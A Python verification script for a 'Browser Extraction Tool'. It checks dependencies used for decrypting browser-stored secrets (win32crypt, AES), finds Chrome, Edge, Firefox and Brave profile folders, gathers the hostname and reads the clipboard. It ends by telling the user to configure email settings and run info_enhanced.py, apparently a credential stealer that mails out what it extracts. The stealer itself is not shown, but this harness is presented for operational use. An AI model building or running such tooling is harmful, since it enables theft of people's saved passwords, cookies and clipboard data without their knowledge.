"""
Simple test script to verify the browser extraction tool works
This checks basic functionality without requiring email configuration
"""

import sys
import os


# Mock the Windows-specific imports for testing
class MockWin32Crypt:
    @staticmethod
    def CryptUnprotectData(data, *args):
        return (None, data)


# Check if we're on Windows
if sys.platform != "win32":
    print("[INFO] Not on Windows - mocking win32crypt for testing")
    sys.modules["win32crypt"] = MockWin32Crypt()


def test_imports():
    """Test if all required imports work"""
    print("\n[TEST] Checking imports...")
    try:
        import json
        import base64
        import sqlite3
        import platform
        import socket
        import re
        import uuid

        print("  ✓ Standard library imports OK")

        try:
            import pyperclip

            print("  ✓ pyperclip OK")
        except ImportError:
            print("  ✗ pyperclip not installed: pip install pyperclip")
            return False

        try:
            from Crypto.Cipher import AES

            print("  ✓ pycryptodome OK")
        except ImportError:
            print("  ✗ pycryptodome not installed: pip install pycryptodome")
            return False

        try:
            import requests

            print("  ✓ requests OK")
        except ImportError:
            print("  ✗ requests not installed: pip install requests")
            return False

        if sys.platform == "win32":
            try:
                import win32crypt

                print("  ✓ pywin32 OK")
            except ImportError:
                print("  ✗ pywin32 not installed: pip install pywin32")
                return False

        return True
    except Exception as e:
        print(f"  ✗ Import error: {e}")
        return False


def test_browser_paths():
    """Test if browser path detection works"""
    print("\n[TEST] Checking browser paths...")

    if sys.platform != "win32":
        print("  ⚠ Skipping (not on Windows)")
        return True

    user_dir = os.environ.get("USERPROFILE")
    if not user_dir:
        print("  ✗ USERPROFILE not found")
        return False

    print(f"  ✓ User directory: {user_dir}")

    browsers = {
        "Chrome": os.path.join(
            user_dir, "AppData", "Local", "Google", "Chrome", "User Data"
        ),
        "Edge": os.path.join(
            user_dir, "AppData", "Local", "Microsoft", "Edge", "User Data"
        ),
        "Firefox": os.path.join(
            user_dir, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"
        ),
        "Brave": os.path.join(
            user_dir, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"
        ),
    }

    found = []
    for name, path in browsers.items():
        if os.path.exists(path):
            print(f"  ✓ {name} found at: {path}")
            found.append(name)
        else:
            print(f"  ✗ {name} not found")

    if found:
        print(f"\n  Found browsers: {', '.join(found)}")
    else:
        print("\n  ⚠ No browsers found (this is OK if you don't have any installed)")

    return True


def test_system_info():
    """Test system information gathering"""
    print("\n[TEST] Checking system info gathering...")
    try:
        import platform
        import socket
        import uuid

        info = {
            "platform": platform.system(),
            "hostname": socket.gethostname(),
            "python_version": platform.python_version(),
        }

        print(f"  ✓ Platform: {info['platform']}")
        print(f"  ✓ Hostname: {info['hostname']}")
        print(f"  ✓ Python: {info['python_version']}")

        return True
    except Exception as e:
        print(f"  ✗ Error: {e}")
        return False


def test_clipboard():
    """Test clipboard access"""
    print("\n[TEST] Checking clipboard access...")
    try:
        import pyperclip

        # Try to read clipboard
        content = pyperclip.paste()
        print(f"  ✓ Clipboard accessible")
        print(
            f"  ✓ Current clipboard: {content[:50]}..."
            if len(content) > 50
            else f"  ✓ Current clipboard: {content}"
        )

        return True
    except Exception as e:
        print(f"  ✗ Clipboard error: {e}")
        return False


def main():
    """Run all tests"""
    print("=" * 60)
    print("Browser Extraction Tool - Verification Tests")
    print("=" * 60)

    results = {
        "Imports": test_imports(),
        "Browser Paths": test_browser_paths(),
        "System Info": test_system_info(),
        "Clipboard": test_clipboard(),
    }

    print("\n" + "=" * 60)
    print("TEST RESULTS")
    print("=" * 60)

    passed = 0
    failed = 0

    for test_name, result in results.items():
        status = "✓ PASS" if result else "✗ FAIL"
        print(f"{test_name:.<50} {status}")
        if result:
            passed += 1
        else:
            failed += 1

    print("=" * 60)
    print(f"Total: {passed} passed, {failed} failed")

    if failed == 0:
        print("\n🎉 All tests passed! The tool should work correctly.")
        print("\nNext steps:")
        print("1. Configure email settings in info_enhanced.py")
        print("2. Run: python info_enhanced.py --test")
        print("3. Check extraction_report.txt for results")
    else:
        print("\n⚠ Some tests failed. Please fix the issues above.")
        print("\nInstall missing dependencies:")
        print("  pip install -r requirements.txt")

    print("=" * 60)


if __name__ == "__main__":
    main()
